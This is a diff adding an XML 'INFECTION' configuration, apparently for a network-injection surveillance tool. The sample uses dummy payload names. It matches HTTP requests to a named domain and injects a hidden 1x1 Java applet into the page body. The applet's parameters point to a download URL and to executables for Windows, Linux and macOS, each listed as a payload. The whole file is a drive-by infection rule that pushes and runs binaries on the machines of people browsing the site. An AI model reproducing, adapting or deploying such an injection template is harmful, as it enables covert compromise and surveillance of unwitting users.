@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="utf-8"?>
+ <INFECTION>
+  <CONDITION>
+   <TYPE>request</TYPE>
+   <DOMAIN>www.gamma-international.de</DOMAIN>
+   <PROTOCOL>http</PROTOCOL>
+  </CONDITION>
+  <INIT>
+   <INJECT>
+    <CODE>
+     <![CDATA[
+     
+     <applet width='1' height='1' name='Dummy Infection' code='Main.class' archive='DummyInfection.jar'>
+     <param name='downloadURL' value='https://www.gamma-international.de//'/>
+     <param name='commandParameter' value=''/>
+     <param name='windowsExecutable' value="Dummy_Infection.exe"/>
+     <param name='linuxExecutable' value="Dummy_Infection.sh"/>
+     <param name='macExecutable' value="Dummy_Infection.dmg"/>
+     <param name='debug' value='anystring'/>
+     
+     </applet>
+     
+     ]]>
+    </CODE>
+    <HTMLSECTION>body</HTMLSECTION>
+    <POSITION>content</POSITION>
+   </INJECT>
+  </INIT>
+  <RESOURCE>
+   <FILE>DummyInfection.jar</FILE>
+   <TYPE>jar</TYPE>
+  </RESOURCE>
+  <PAYLOAD>
+   <FILE>Dummy_Infection.exe</FILE>
+   <TYPE>bin</TYPE>
+  </PAYLOAD>
+  <PAYLOAD>
+   <FILE>Dummy_Infection.sh</FILE>
+   <TYPE>bin</TYPE>
+  </PAYLOAD>
+  <PAYLOAD>
+   <FILE>Dummy_Infection.dmg</FILE>
+   <TYPE>bin</TYPE>
+  </PAYLOAD>
+ </INFECTION>
